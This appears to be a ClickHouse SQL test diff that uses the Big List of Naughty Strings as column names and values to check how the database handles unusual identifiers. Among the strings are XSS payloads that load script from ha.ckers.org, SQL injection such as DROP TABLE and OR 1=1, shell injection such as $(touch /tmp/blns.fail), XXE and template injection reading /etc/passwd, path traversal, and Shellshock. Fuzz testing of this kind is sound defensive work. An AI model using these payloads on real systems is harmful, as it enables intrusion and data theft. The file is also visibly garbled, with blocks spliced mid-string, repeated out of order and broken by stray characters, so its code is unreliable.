+  "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣" String,
+  "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰" String,
+  "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟" String,
+  "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕" String,
+  "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮" String,
+  "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥" String,
+  "00˙Ɩ$-" String,
+  "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ" String,
+  "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠" String,
+  "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌" String,
+  "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐�SS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>" String,
+  "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>" String,
+  "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >" String,
+  "<SCRIPT SRC=//ha.ckers.org/.j>" String,
+  "<IMG SRC=\"javascript:alert('XSS')\"" String,
+  "<iframe src=http://ha.ckers.org/scriptlet.html <" String,
+  "\\\";alert('XSS');//" String,
+  "<u oncopy=alert()> Copy me</u>" String,
+  "<i onwheel=alert(1)> Scroll over me </i>" String,/  "<plaintext>" String,
+  "http://a/%%30%30" String,
+  "</textarea><script>alert(123)</script>" String,
+  "1;DROP TABLE users" String,
+  "1'; DROP TABLE users-- 1" String,
+  "' OR 1=1 -- 1" String,
+  "' OR '1'='1" String,
+  "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --" String,
+  " " String,
+  "%" String,
+  "_" String,
+  "--" String,
+  "--version" String,
+  "--help" String,
+  "$USER" String,
+  "/dev/null; touch /tmp/blns.fail ; echo" String,
+  "`touch /tmp/blns.fail`" String,
+  "$(touch /tmp/blns.fail)" String,
+  "@{[system \"touch /tmp/blns.fail\"]}" String,
+  "eval(\"puts 'hello world'\")" String,
+  "System(\"ls -al /\")" String,
+  "`ls -al /`" String,
+  "Kernel.exec(\"ls -al /\")" String,
+  "Kernel.exit(1)" String,
+  "%x('ls -al /')" String,
+  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>" String,
+  "$HOME" String,
+  "$ENV{'HOME'}" String,
+  "%d" String,
+  "%s%s%s%s%s" String,
+  "{0}" String,
+  "%*.*s" String,
+  "%@" String,
+  "%n" String,
+  "File:///" String,
+  "../../../../../../../../../../../etc/passwd%00" String,
+  "../../../../../../../../../../../etc/hosts" String,
+  "() { 0; }; touch /tmp/blns.shellshock1.fail;" String,
+  "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }" String,
+  "<<< %s(un='%s') = %u" String,
+  "+++ATH0" String,
+  "CON" Strin`````````````````````````````````````````````````````````````````````````````````````````````````````````g,
+  "PRN" String,
+  "AUX" String,
+  "CLOCK$" String,
+  "NUL" String,
+  "A:" String,
+  "ZZ:" String,
+  "COM1" String,
+  "LPT1" String,
+  "LPT2" String,
+  "LPT3" String,
+  "COM2" String,
+  "COM3" String,
+  "COM4" String,
+  "DCC SEND STARTKEYLOGGER 0 0 0" String,
+  "Scunthorpe General Hospital" String,
+  "Penistone Community Church" String,
+  "Lightwater Country Park" String,
+  "Jimmy Clitheroe" String,
+  "Horniman Museum" String,
+  "shitake mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're readi', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please wake up, we miss you.','Roses are \\u001b[0;31mred\\u001b[0m, violets are \\u001b[0;34mblue. Hope you enjoy terminal hue','But now...\\u001b[20Cfor my greatest trick...\\u001b[8m','The quic\b\b\b\b\b\bk brown fo\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007x... [Beeeep]','Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗','🏳0🌈️','జ్ఞ‌ా','گچپژ','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}' FORMAT PrettyCompactNoEscapes;
+
+SELECT JSONExtract(
+    '{"x": [\n  "", \n  "undefined", \n  "undef", \n  "null", \n  "NULL", \n  "(null)", \n  "nil", \n  "NIL", \n  "true", \n  "false", \n  "True", \n  "False", \n  "TRUE", \n  "FALSE", \n  "None", \n  "hasOwnProperty", \n  "then", \n  "\\\\", \n  "\\\\\\\\", \n  "0", \n  "1", \n  "1.00", \n  "$1.00", \n  "1mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็�-- Tags: long
+
+-- https://github.com/minimaxir/big-list-of-naughty-strings
+
+/*
+The MIT License (MIT)
+
+Copyright (c) 2015-2020 Max Woolf
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+*/
+
+SET max_insert_threads = 0;
+
+DROP TABLE IF EXISTS test;
+
+CREATE TABLE test
+(
+  "undefined" String,
+  "undef" String,
+  "null" String,
+  "NULL" String,
+  "(null)" String,
+  "nil" String,
+  "NIL" String,
+  "true" String,
+  "false" String,
+  "True" String,
+  "False" String,
+  "TRUE" String,
+  "FALSE" String,
+  "None" String,
+  "hasOwnProperty" String,
+  "then" String,
+  "\\" String,
+  "\\\\" String,
+  "0" String,
+  "1" String,
+  "1.00" String,
+  "$1.00" String,
+  "1/2" String,
+  "1E2" String,
+  "1E02" String,
+  "1E+02" String,
+  "-1" String,
+  "-1.00" String,
+  "-$1.00" String,
+  "-1/2" String,
+  "-1E2" String,
+  "-1E02" String,
+  "-1E+02" String,
+  "1/0" String,
+  "0/0" String,
+  "-2147483648/-1" String,
+  "-9223372036854775808/-1" String,
+  "-0" String,
+  "-0.0" String,
+  "+0" String,
+  "+0.0" String,
+  "0.00" String,
+  "0..0" String,
+  "." String,
+  "0.0.0" String,
+  String,
+  "사회과학원 어학연구소" String,
+  "찦차를 타고 온 펲시맨과 쑛다리 똠방각하" String,
+  "社會科學院語學研究所" String,
+  "울란바토르" String,
+  "𠜎𠜱𠝹𠱓𠱸𠲖𠳏" String,
+  "𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖𐐇𐐤𐐓𐐝 𐐱𐑂 𐑄 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐏𐐆𐐅𐐤𐐆𐐚𐐊𐐡𐐝𐐆𐐓𐐆" String,
+  "表ポあA鷗ŒéＢ逍Üßªąñ丂㐀𠀀" String,
+  "Ⱥ" String,
+  "Ⱦ" String,
+  "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ" String,
+  "(｡◕ ∀ ◕｡)" String,
+  "｀ｨ(´∀｀∩" String,
+  "__ﾛ(,_,*)" String,
+  "・(￣∀￣)・:*:" String,
+  "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ" String,
+  ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’" String,
+  "(╯°□°）╯︵ ┻━┻)" String,
+  "(ﾉಥ益ಥ）ﾉ﻿ ┻━┻" String,
+  "┬─┬ノ( º _ ºノ)" String,
+  "( ͡° ͜ʖ ͡°)" String,
+  "¯\\_(ツ)_/¯" String,
+  "😍" String,
+  "👩🏽" String,
+  "👨‍🦰 👨🏿‍🦰 👨‍🦱 👨🏿‍🦱 🦹🏿‍♂️" String,
+  "👾 🙇 💁 🙅 🙆 🙋 🙎 🙍" String,
+  "🐵 🙈 🙉 🙊" String,
+  "❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙" String,
+ �"� �𜋿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿" String,
+  "👨‍👩‍👦 👨‍👩‍👧‍👦 👨‍👨‍👦 👩‍👩‍👧 👨‍👦 👨‍👧‍👦 👩‍👦 👩‍👧‍👦" String,
+  "🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧" String,
+  "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟" String,
+  "🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸" String,
+  "🇺🇸🇷🇺🇸🇦🇫🇦🇲" String,
+  "🇺🇸🇷🇺🇸🇦" String,
+  "１２３" String,
+  "١٢٣" String,
+  "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن��" String,
+  "찦차를 타고 온 펲시맨과 쑛다리 똠방각하" String,
+  "社會科學院語學研究所" String,
+  "울란바토르" String,
+  "𠜎𠜱𠝹𠱓𠱸𠲖𠳏" String,
+  "𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖𐐇𐐤𐐓𐐝 𐐱𐑂 𐑄 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐏𐐆𐐅𐐤𐐆𐐚𐐊𐐡𐐝𐐆𐐓𐐆" String,
+  "表ポあA鷗ŒéＢ逍Üßªąñ丂㐀𠀀" String,
+  "Ⱥ" String,
+  "Ⱦ" String,
+  "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ" String,
+  "(｡◕ ∀ ◕｡)" String,
+  "｀ｨ(´∀｀∩" String,
+  "__ﾛ(,_,*)" String,
+  "・(￣∀￣)・:*:" String,
+  "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ" String,
+  ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’" String,
+  "(╯°□°）╯︵ ┻━┻)" String,
+  "(ﾉಥ益ಥ）ﾉ﻿ ┻━┻" String,
+  "┬─┬ノ( º _ ºノ)" String,
+  "( ͡° ͜ʖ ͡°)" String,
+  "¯\\_(ツ)_/¯" String,
+  "😍" String,
+  "👩🏽" String,
+  "👨‍🦰 👨🏿‍🦰 👨‍🦱 👨🏿‍🦱 🦹🏿‍♂️" String,
+  "👾 🙇 💁 🙅 🙆 🙋 🙎 🙍" String,
+  "🐵 🙈 🙉 🙊" String,
+  "❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙" String,
+ �"� �𜋿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿" String,
+  "👨‍👩‍👦 👨‍👩‍👧‍👦 👨‍👨‍👦 👩‍👩‍👧 👨‍👦 👨‍👧‍👦 👩‍👦 👩‍👧‍👦" String,
+  "🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧" String,
+  "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟" String,
+  "🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸" String,
+  "🇺🇸🇷🇺🇸🇦🇫🇦🇲" String,
+  "🇺🇸🇷🇺🇸🇦" String,
+  "１２３" String,
+  "١٢٣" String,
+  "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما , يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو." String,
+  "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ" String,
+  "הָיְתָהtestالصفحات التّحول" String,
+  "﷽" String,
+  "ﷺ" String,
+  "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ، " String,
+  "᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜‪‪‪" String,
+  "‪‪᚛                 ᚜‪" String,
+  "‪‪test‪" String,
+  "‫test‫" String,
+  " test " String,
+  "test⁠test‫" String,
+  "⁦test⁧" String,
+  "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣" String,
+  "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰" String,
+  "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟" String,
+  "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕" String,
